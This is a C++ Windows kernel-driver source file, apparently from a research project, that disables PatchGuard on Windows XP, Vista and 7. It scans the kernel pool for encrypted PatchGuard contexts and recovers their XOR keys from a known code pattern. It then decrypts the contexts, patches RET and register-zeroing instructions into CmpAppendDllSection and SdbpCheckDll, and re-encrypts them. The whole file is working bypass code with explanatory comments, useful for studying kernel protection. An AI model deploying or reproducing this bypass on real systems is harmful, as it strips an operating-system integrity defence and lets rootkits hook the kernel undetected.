//
// This module implements the functions that used to disable PatchGuard on Win
// 7, Vista and XP.
//
#include "stdafx.h"
#include "winX.h"
#include "util.h"
#include "exclusivity.h"
#include "../../Common/PgContext.h"


////////////////////////////////////////////////////////////////////////////////
//
// macro utilities
//


////////////////////////////////////////////////////////////////////////////////
//
// constants and macros
//

// Change it to 0xCC when you want to install break points for patched code
static const UCHAR WINX_HOOK_CODE = 0x90;

// Offset in bytes to install patch on CmpAppendDllSection
static const ULONG WINX_HOOK_OFFSET = 8;

// Tag used for memory allocation APIs
static const ULONG WINX_TAG = 'winX';

// Code taken from CmpAppendDllSection. Take long enough code to avoid false
// positive.
static const ULONG64 WINX_CmpAppendDllSection_PATTERN[] =
{
    0x085131481131482E,
    0x1851314810513148,
    0x2851314820513148,
    0x3851314830513148,
    0x4851314840513148,
    0x5851314850513148,
    0x6851314860513148,
    0x7851314870513148,
    0x4800000080913148,
    0x3148000000889131,
    0x9131480000009091,
    0xA091314800000098,
    0x00A8913148000000,
    0x0000B09131480000,
    0x000000B891314800,
    0x31000000C0913148,
    0x8BD18B48C28B4811,
    0x843148000000C48A,
    0xC8D348000000C0CA,
};
// Just to know the length
C_ASSERT(sizeof(WINX_CmpAppendDllSection_PATTERN) == 0x98);

// Code taken from SdbpCheckDll. Take long enough code to avoid false positive.
static const ULONG64 WINX_SdbpCheckDll_PATTERN[] =
{
    0x7C8B483024748B48,
    0x333824548B4C2824,
    0x08EA8349028949C0,
};


////////////////////////////////////////////////////////////////////////////////
//
// types
//

// The number to multiply to convert Size field value in bytes.
template <typename TableType>
struct Multiplier;

template <>
struct Multiplier<POOL_TRACKER_BIG_PAGES>
{
    static const SIZE_T value = 1;      // Size is in bytes
};

template <>
struct Multiplier<POOL_TRACKER_BIG_PAGES_XP>
{
    static const SIZE_T value = 0x1000; // Size is in pages
};

// A callback function type for EnumBigPages
using EnumBigPagesCallbackType = bool(*)(
    __in ULONG_PTR StartAddress,
    __in SIZE_T SizeInBytes,
    __in ULONG Key,
    __inout_opt void* Context);


// Represents a PatchGuard context
struct PatchGuardContextInfo
{
    ULONG_PTR PgContext;    // An address of PatchGuard context
    ULONG64 XorKey;         // XorKey to decrypt it, or 0 when it has already
                            // been decrypted.
};


struct PatchGuardContexts
{
    static const SIZE_T MAX_SUPPORTED_NUMBER_OF_PG_CONTEXTS = 30;
    SIZE_T NumberOfPgContexts;
    PatchGuardContextInfo PgContexts[MAX_SUPPORTED_NUMBER_OF_PG_CONTEXTS];
};


////////////////////////////////////////////////////////////////////////////////
//
// prototypes
//

template <typename TableType> static
void WinXpEnumBigPages(
    __in EnumBigPagesCallbackType Callback,
    __in_opt void* Context,
    __in_opt ULONG KeyFilter,
    __in_opt SIZE_T MinSizeFilter,
    __in TableType* BigPageTable,
    __in SIZE_T NumberOfBigPageTable);

EXTERN_C static
bool WinXpCollectPatchGuardContexts(
    __in ULONG_PTR StartAddress,
    __in SIZE_T SizeInBytes,
    __in ULONG Key,
    __inout_opt void* Context);

EXTERN_C static
SIZE_T WinXpSearchPatchGuardContext(
    __in ULONG_PTR SearchBase,
    __in SIZE_T SearchSize,
    __out PatchGuardContextInfo& Result);

EXTERN_C static
bool WinXpIsCmpAppendDllSection(
    __in const ULONG64* AddressToBeChecked,
    __in ULONG64 PossibleXorKey);

EXTERN_C static
void WinXpInstallPatchOnPatchGuardContext(
    __in PatchGuardContextInfo& Info);

EXTERN_C static
void WinXpEncryptPatchGuardContext(
    __in PatchGuardContextInfo& Info,
    __in PgContextBase* DecryptedPgContext);

EXTERN_C static
PgContextBase* WinXpDecryptPatchGuardContext(
    __in PatchGuardContextInfo& Info);

EXTERN_C static
bool WinXpIsPatchGuardContextPatched(
    __in const PgContextBase& PgContext);

EXTERN_C static
void WinXpInstallPatchForEncryptedPatchGuardContext(
    __in PatchGuardContextInfo& Info);

EXTERN_C static
void WinXpInstallPatchForDecryptedPatchGuardContext(
    __in PatchGuardContextInfo& Info);


////////////////////////////////////////////////////////////////////////////////
//
// variables
//

static WinXSymbols g_WinXSymbols;


////////////////////////////////////////////////////////////////////////////////
//
// implementations
//

// Disable PatchGuard by decrypting and patching their code
ALLOC_TEXT(INIT, WinXDisablePatchGuard)
EXTERN_C
NTSTATUS WinXDisablePatchGuard(
    __in const WinXSymbols& Symbols)
{
    // Based on the size of FsRtlMdlReadCompleteDevEx on each platform
    static const SIZE_T MIN_SIZE_FILTER_XP = 0x2000;
    static const SIZE_T MIN_SIZE_FILTER = 0x4000;

    g_WinXSymbols = Symbols;

    auto exclusivity = ExclGainExclusivity();
    if (!exclusivity)
    {
        return STATUS_UNSUCCESSFUL;
    }

    // Collects all PatchGuard contexts
    PatchGuardContexts contexts = {};
    if (Symbols.PoolBigPageTableXp)
    {
        // For XP
        WinXpEnumBigPages(WinXpCollectPatchGuardContexts, &contexts, 0,
            MIN_SIZE_FILTER_XP,
            *g_WinXSymbols.PoolBigPageTableXp,
            *g_WinXSymbols.PoolBigPageTableSize);
    }
    else
    {
        // For 7 and Vista
        WinXpEnumBigPages(WinXpCollectPatchGuardContexts, &contexts, 0,
            MIN_SIZE_FILTER,
            *g_WinXSymbols.PoolBigPageTable,
            *g_WinXSymbols.PoolBigPageTableSize);
    }

    //DBG_BREAK();
    DBG_PRINT("[%5Iu:%5Iu] Initialize : %Iu contexts found.\n",
        reinterpret_cast<ULONG_PTR>(PsGetCurrentProcessId()),
        reinterpret_cast<ULONG_PTR>(PsGetCurrentThreadId()),
        contexts.NumberOfPgContexts);

    auto status = STATUS_SUCCESS;
    if (!contexts.NumberOfPgContexts ||
        contexts.NumberOfPgContexts
        == contexts.MAX_SUPPORTED_NUMBER_OF_PG_CONTEXTS)
    {
        // If a lot of PatchGuard contexts were found, it is likely an error
        status = STATUS_UNSUCCESSFUL;
    }
    else
    {
        // Install patches for all contexts
        for (SIZE_T i = 0; i < contexts.NumberOfPgContexts; ++i)
        {
            WinXpInstallPatchOnPatchGuardContext(contexts.PgContexts[i]);
        }
    }

    ExclReleaseExclusivity(exclusivity);
    return status;
}


// Enumerate all big pages and calls a callback routine when it matched with
// a criteria specified by filters parameters. It stops to enumerate when the
// callback returned false.
template <typename TableType> static
void WinXpEnumBigPages(
    __in EnumBigPagesCallbackType Callback,
    __in_opt void* Context,
    __in_opt ULONG KeyFilter,
    __in_opt SIZE_T MinSizeFilter,
    __in TableType* BigPageTable,
    __in SIZE_T NumberOfBigPageTable)
{
    DBG_PRINT("[%5Iu:%5Iu] Initialize : PoolBigPageTable = %p\n",
        reinterpret_cast<ULONG_PTR>(PsGetCurrentProcessId()),
        reinterpret_cast<ULONG_PTR>(PsGetCurrentThreadId()),
        BigPageTable);
    DBG_PRINT("[%5Iu:%5Iu] Initialize : PoolBigPageTableSize = %p\n",
        reinterpret_cast<ULONG_PTR>(PsGetCurrentProcessId()),
        reinterpret_cast<ULONG_PTR>(PsGetCurrentThreadId()),
        NumberOfBigPageTable);

    for (SIZE_T i = 0; i < NumberOfBigPageTable; ++i)
    {
        auto entry = &BigPageTable[i];
        auto startAddr = reinterpret_cast<ULONG_PTR>(entry->Va);

        // Ignore unused entries
        if (!startAddr || (startAddr & 1))
        {
            continue;
        }

        // Get the size in bytes
        const auto sizeInBytes = entry->Size * Multiplier<TableType>::value;

        // Filter if it is needed
        if ((KeyFilter && entry->Key != KeyFilter)
         || (sizeInBytes < MinSizeFilter))
        {
            continue;
        }

        // Call a callback function
        if (!Callback(startAddr, sizeInBytes, entry->Key, Context))
        {
            break;
        }
    }
}


// Search and collect a PatchGuard context from a given big page range
ALLOC_TEXT(INIT, WinXpCollectPatchGuardContexts)
EXTERN_C static
bool WinXpCollectPatchGuardContexts(
    __in ULONG_PTR StartAddress,
    __in SIZE_T SizeInBytes,
    __in ULONG Key,
    __inout_opt void* Context)
{
    // Ignore this if the address is not in the NonPaged pool
    if (StartAddress < *g_WinXSymbols.MmNonPagedPoolStart)
    {
        return true;
    }

    if (!Context)
    {
        return false;
    }

    auto storage = static_cast<PatchGuardContexts*>(Context);
    PatchGuardContextInfo result = {};
    for (SIZE_T searchedBytes = 0; searchedBytes < SizeInBytes; /**/)
    {
        // Search a context
        const auto remainingBytes = SizeInBytes - searchedBytes;
        const auto searchPosition = StartAddress + searchedBytes;
        const auto checkedBytes = WinXpSearchPatchGuardContext(
            searchPosition, remainingBytes, result);
        searchedBytes += checkedBytes;

        // Check if a context was found
        if (result.PgContext)
        {
            // save it to the storage
            storage->PgContexts[storage->NumberOfPgContexts] = result;
            storage->NumberOfPgContexts++;

            DBG_PRINT("[%5Iu:%5Iu] PatchGuard %016llX : XorKey %016llX\n",
                reinterpret_cast<ULONG_PTR>(PsGetCurrentProcessId()),
                reinterpret_cast<ULONG_PTR>(PsGetCurrentThreadId()),
                result.PgContext, result.XorKey);
            break;
        }
    }

    // Tell WinXpEnumBigPages to stop enumerating pages when the storage is full
    return (storage->NumberOfPgContexts <
            storage->MAX_SUPPORTED_NUMBER_OF_PG_CONTEXTS);
}


// Searches a PatchGuard context by calling a check routine for each byte, and
// returns how many bytes were searched.
ALLOC_TEXT(INIT, WinXpSearchPatchGuardContext)
EXTERN_C static
SIZE_T WinXpSearchPatchGuardContext(
    __in ULONG_PTR SearchBase,
    __in SIZE_T SearchSize,
    __out PatchGuardContextInfo& Result)
{
    const auto maxSearchSize =
        SearchSize - sizeof(WINX_CmpAppendDllSection_PATTERN);
    for (SIZE_T searchedBytes = 0; searchedBytes < maxSearchSize;
        ++searchedBytes)
    {
        const auto addressToBeChecked =
            reinterpret_cast<ULONG64*>(SearchBase + searchedBytes);

        // PatchGuard contexts never have the same value on their first some
        // bytes.
        if (addressToBeChecked[0] == addressToBeChecked[1])
        {
            continue;
        }

        // Here is the best part; as we know the decrypted form of PatchGuard
        // context, namely CmpAppendDllSection, we can deduce a possible XOR key
        // by doing XOR with CmpAppendDllSection and code of the current address.
        // At this moment, possibleXorKey may or may not be a right one, but by
        // decrypting code with the key, we can see if it generates correct
        // decrypted pattern (CmpAppendDllSection). If it showed the pattern,
        // it is a correct XOR key. Do it with WinXpIsCmpAppendDllSection.
        const auto possibleXorKey =
            addressToBeChecked[1] ^ WINX_CmpAppendDllSection_PATTERN[1];
        if (!WinXpIsCmpAppendDllSection(addressToBeChecked, possibleXorKey))
        {
            continue;
        }

        // A PatchGuard context was found
        Result.PgContext = reinterpret_cast<ULONG_PTR>(addressToBeChecked);
        Result.XorKey = possibleXorKey;
        return searchedBytes + 1;
    }
    return SearchSize;
}


// Return true when AddressToBeChecked became CmpAppendDllSection by doing XOR
// with PossibleXorKey.
ALLOC_TEXT(INIT, WinXpIsCmpAppendDllSection)
EXTERN_C static
bool WinXpIsCmpAppendDllSection(
    __in const ULONG64* AddressToBeChecked,
    __in ULONG64 PossibleXorKey)
{
    const auto NUMBER_OF_TIMES_TO_COMPARE =
        sizeof(WINX_CmpAppendDllSection_PATTERN) / sizeof(ULONG64);
    C_ASSERT(NUMBER_OF_TIMES_TO_COMPARE == 19);

    for (int i = 2; i < NUMBER_OF_TIMES_TO_COMPARE; ++i)
    {
        const auto decryptedContents = AddressToBeChecked[i] ^ PossibleXorKey;
        if (decryptedContents != WINX_CmpAppendDllSection_PATTERN[i])
        {
            return false;
        }
    }
    return true;
}


// Install patches on a PatchGuard context according to its state
ALLOC_TEXT(INIT, WinXpInstallPatchOnPatchGuardContext)
EXTERN_C static
void WinXpInstallPatchOnPatchGuardContext(
    __in PatchGuardContextInfo& Info)
{
    if (Info.XorKey)
    {
        // encrypted
        WinXpInstallPatchForEncryptedPatchGuardContext(Info);
    }
    else
    {
        // decrypted
        WinXpInstallPatchForDecryptedPatchGuardContext(Info);
    }
}


// Install RET on the very beginning of PatchGuard code, namely
// CmpAppendDllSection, by decrypting them. They are in the DPC queue now, and
// once the timer expired, they decrypts themselves and run CmpAppendDllSection,
// but nothing will happen since we installed RET there.
ALLOC_TEXT(INIT, WinXpInstallPatchForEncryptedPatchGuardContext)
EXTERN_C static
void WinXpInstallPatchForEncryptedPatchGuardContext(
    __in PatchGuardContextInfo& Info)
{
    auto pgContext = WinXpDecryptPatchGuardContext(Info);
    pgContext->CmpAppendDllSection[WINX_HOOK_OFFSET + 0] = WINX_HOOK_CODE;
    pgContext->CmpAppendDllSection[WINX_HOOK_OFFSET + 1] = 0xc3;   // RET
    ASSERT(WinXpIsPatchGuardContextPatched(*pgContext));
    WinXpEncryptPatchGuardContext(Info, pgContext);
}


// Install RET on SdbpCheckDll (a BugCheck caller). PatchGuard is now sleeping
// on FsRtlMdlReadCompleteDevEx, so it should be fine if SdbpCheckDll is
// disabled.
ALLOC_TEXT(INIT, WinXpInstallPatchForDecryptedPatchGuardContext)
EXTERN_C static
void WinXpInstallPatchForDecryptedPatchGuardContext(
    __in PatchGuardContextInfo& Info)
{
    // Do not do anything for a patched context, just in case.
    auto pgContext = reinterpret_cast<PgContextBase*>(Info.PgContext);
    if (WinXpIsPatchGuardContextPatched(*pgContext))
    {
        return;
    }

    // Install hook
    static const auto HEADER_SIZE =
        FIELD_OFFSET(PgContextBase, ExAcquireResourceSharedLite);
    const auto searchSizeInBytes =
        pgContext->ContextSizeInQWord * sizeof(ULONG64)+HEADER_SIZE;

    auto pgSdbpCheckDll = MemMem(pgContext, searchSizeInBytes,
        &WINX_SdbpCheckDll_PATTERN[0], sizeof(WINX_SdbpCheckDll_PATTERN));
    ASSERT(pgSdbpCheckDll);

    // Make r13 and r14 zero. These are used as PgContext pointer later, and if
    // values are zero, PatchGuard gracefully ends its activity.
    static const UCHAR PATCH_CODE[] =
    {
        WINX_HOOK_CODE,         // nop or int 3
        0x4D, 0x33, 0xED,       // xor     r13, r13
        0x4D, 0x33, 0xF6,       // xor     r14, r14
        0xc3,                   // ret
    };
    PatchReal(pgSdbpCheckDll, PATCH_CODE, sizeof(PATCH_CODE));

    // Also, install hook at CmpAppendDllSection because it may be called at
    // the next time as we disabled SdbpCheckDll.
    pgContext->CmpAppendDllSection[WINX_HOOK_OFFSET + 0] = WINX_HOOK_CODE;
    pgContext->CmpAppendDllSection[WINX_HOOK_OFFSET + 1] = 0xc3;   // RET
    ASSERT(WinXpIsPatchGuardContextPatched(*pgContext));
}


// Return true if the patch has already been installed on the context
ALLOC_TEXT(INIT, WinXpIsPatchGuardContextPatched)
EXTERN_C static
bool WinXpIsPatchGuardContextPatched(
    __in const PgContextBase& PgContext)
{
    return (PgContext.CmpAppendDllSection[WINX_HOOK_OFFSET] == WINX_HOOK_CODE);
}


// Decrypts the PatchGuard context with a given XOR key and returns the casted
// pointer. This algorithm is implemented in CmpAppendDllSection.
ALLOC_TEXT(INIT, WinXpDecryptPatchGuardContext)
EXTERN_C static
PgContextBase* WinXpDecryptPatchGuardContext(
    __in PatchGuardContextInfo& Info)
{
    // The first some bytes can simply be XOR-ed
    auto pgContext = reinterpret_cast<ULONG64*>(Info.PgContext);
    static const auto NUMBER_OF_TIMES_TO_DECRYPT =
        FIELD_OFFSET(PgContextBase, ExAcquireResourceSharedLite)
        / sizeof(ULONG64);
    C_ASSERT(NUMBER_OF_TIMES_TO_DECRYPT == 0x19);
    for (SIZE_T i = 0; i < NUMBER_OF_TIMES_TO_DECRYPT; ++i)
    {
        pgContext[i] ^= Info.XorKey;
    }

    // The above decrypts ContextSizeInQWord field, so let's decrypt the
    // remaining bytes according to the value. Note that this decryption
    // requires key location.
    auto decryptionKey = Info.XorKey;
    auto decryptedPgContext = reinterpret_cast<PgContextBase*>(pgContext);
    for (auto i = decryptedPgContext->ContextSizeInQWord; i; --i)
    {
        pgContext[i + NUMBER_OF_TIMES_TO_DECRYPT - 1] ^= decryptionKey;
        decryptionKey = _rotr64(decryptionKey, static_cast<UCHAR>(i));
    }

    // Once decryption is completed, ExAcquireResourceSharedLite field should
    // be the same as the value taken from a symbol.
    ASSERT(decryptedPgContext->ExAcquireResourceSharedLite ==
        g_WinXSymbols.ExAcquireResourceSharedLite);
    return decryptedPgContext;
}


// Encrypts the PatchGuard context with a given XOR key. It does the same things
// with reversed order
ALLOC_TEXT(INIT, WinXpEncryptPatchGuardContext)
EXTERN_C static
void WinXpEncryptPatchGuardContext(
    __in PatchGuardContextInfo& Info,
    __in PgContextBase* DecryptedPgContext)
{
    const auto pgContextSize = DecryptedPgContext->ContextSizeInQWord;
    auto pgContext = reinterpret_cast<ULONG64*>(Info.PgContext);
    static const auto NUMBER_OF_TIMES_TO_ENCRYPT =
        FIELD_OFFSET(PgContextBase, ExAcquireResourceSharedLite)
        / sizeof(ULONG64);
    C_ASSERT(NUMBER_OF_TIMES_TO_ENCRYPT == 0x19);
    for (SIZE_T i = 0; i < NUMBER_OF_TIMES_TO_ENCRYPT; ++i)
    {
        pgContext[i] ^= Info.XorKey;
    }

    auto decryptionKey = Info.XorKey;
    for (auto i = pgContextSize; i; --i)
    {
        pgContext[i + NUMBER_OF_TIMES_TO_ENCRYPT - 1] ^= decryptionKey;
        decryptionKey = _rotr64(decryptionKey, static_cast<UCHAR>(i));
    }
}

